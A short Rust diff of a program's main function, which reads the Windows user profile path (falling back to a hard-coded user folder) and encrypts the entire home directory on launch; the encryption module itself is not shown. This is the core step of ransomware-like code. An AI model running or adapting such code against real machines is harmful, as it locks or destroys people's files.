@@ -1,12 +1,11 @@
 mod crypto;
 use crypto::encrypt_directory;
-extern crate dirs;
-use dirs::home_dir;
+use std::env;
 
 fn main() {
-    let home = home_dir().unwrap(); // no way this could fail!
+    let home: String = env::var("USERPROFILE").unwrap_or("C:\\Users\\Xory".to_string()); // no way this could fail!
     dbg!(&home);
-    encrypt_directory(home.to_str().unwrap()).unwrap(); // I know this many unwraps look
+    encrypt_directory(&home).unwrap(); // I know this many unwraps look
                                                         // suspicious, but the chance of this
                                                         // failing is less than a solar flare.
 }
